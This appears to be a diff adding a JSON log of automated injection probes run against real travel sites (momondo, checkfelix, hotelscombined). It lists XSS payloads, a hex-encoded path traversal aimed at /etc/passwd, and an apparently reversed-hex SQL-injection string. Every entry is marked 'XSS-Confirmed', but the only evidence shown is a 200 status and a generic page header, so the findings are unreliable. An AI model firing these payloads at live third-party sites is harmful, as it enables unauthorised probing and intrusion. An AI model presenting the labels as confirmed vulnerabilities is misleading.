@@ -1,0 +1,37 @@
+[
+  {
+    "url": "https://www.momondo.com?q=<div style='display:none'><!--<img src=x onerror=alert('xss')>--></div>",
+    "status": 200,
+    "payload": "<div style='display:none'><!--<img src=x onerror=alert('xss')>--></div>",
+    "type": "XSS-Confirmed",
+    "snippet": "<!DOCTYPE html>\n<html lang='en-us' dir='ltr'>\n<head>\n<meta name=\"r9-version\" content=\"R768c\"/><meta name=\"r9-built\" content=\"20250521.060118\"/><meta name=\"r9-rendered\" content=\"Thu, 22 May 2025 06:16:57 GMT\"/><meta name=\"r9-build-number\" content=\"52\"/><link rel=\"stylesheet\" href=\"https://content.r9c"
+  },
+  {
+    "url": "https://www.momondo.com?q=<form action='/submit'><input name='note' value='<body onload=<img src=x onerror=alert('xss')>>'></form>",
+    "status": 200,
+    "payload": "<form action='/submit'><input name='note' value='<body onload=<img src=x onerror=alert('xss')>>'></form>",
+    "type": "XSS-Confirmed",
+    "snippet": "<!DOCTYPE html>\n<html lang='en-us' dir='ltr'>\n<head>\n<meta name=\"r9-version\" content=\"R768c\"/><meta name=\"r9-built\" content=\"20250521.060118\"/><meta name=\"r9-rendered\" content=\"Thu, 22 May 2025 06:25:37 GMT\"/><meta name=\"r9-build-number\" content=\"52\"/><link rel=\"stylesheet\" href=\"https://content.r9c"
+  },
+  {
+    "url": "https://www.momondo.com?q=<form action='/submit'><input name='note' value='<!--<img src=x onerror=alert('xss')>-->'></form>",
+    "status": 200,
+    "payload": "<form action='/submit'><input name='note' value='<!--<img src=x onerror=alert('xss')>-->'></form>",
+    "type": "XSS-Confirmed",
+    "snippet": "<!DOCTYPE html>\n<html lang='en-us' dir='ltr'>\n<head>\n<meta name=\"r9-version\" content=\"R768c\"/><meta name=\"r9-built\" content=\"20250521.060118\"/><meta name=\"r9-rendered\" content=\"Thu, 22 May 2025 06:48:53 GMT\"/><meta name=\"r9-build-number\" content=\"52\"/><link rel=\"stylesheet\" href=\"https://content.r9c"
+  },
+  {
+    "url": "https://www.checkfelix.com?q=<textarea>\\x2e\\x2e\\x2f\\x2e\\x2e\\x2f\\x2e\\x2e\\x2f\\x65\\x74\\x63\\x2f\\x70\\x61\\x73\\x73\\x77\\x64</textarea>",
+    "status": 200,
+    "payload": "<textarea>\\x2e\\x2e\\x2f\\x2e\\x2e\\x2f\\x2e\\x2e\\x2f\\x65\\x74\\x63\\x2f\\x70\\x61\\x73\\x73\\x77\\x64</textarea>",
+    "type": "XSS-Confirmed",
+    "snippet": "<!DOCTYPE html>\n<html lang='de-at' dir='ltr'>\n<head>\n<meta name=\"r9-version\" content=\"R768c\"/><meta name=\"r9-built\" content=\"20250521.060118\"/><meta name=\"r9-rendered\" content=\"Thu, 22 May 2025 07:15:36 GMT\"/><meta name=\"r9-build-number\" content=\"52\"/><link rel=\"stylesheet\" href=\"https://content.r9c"
+  },
+  {
+    "url": "https://www.hotelscombined.com?q=13x\\72x\\d3x\\72x\\13x\\72x\\02x\\25x\\f4x\\02x\\72x\\",
+    "status": 200,
+    "payload": "13x\\72x\\d3x\\72x\\13x\\72x\\02x\\25x\\f4x\\02x\\72x\\",
+    "type": "XSS-Confirmed",
+    "snippet": "<!DOCTYPE html>\n<html lang='en-us' dir='ltr'>\n<head>\n<meta name=\"r9-version\" content=\"R768c\"/><meta name=\"r9-built\" content=\"20250521.060118\"/><meta name=\"r9-rendered\" content=\"Thu, 22 May 2025 08:17:06 GMT\"/><meta name=\"r9-build-number\" content=\"52\"/><link rel=\"stylesheet\" href=\"https://content.r9c"
+  }
+]
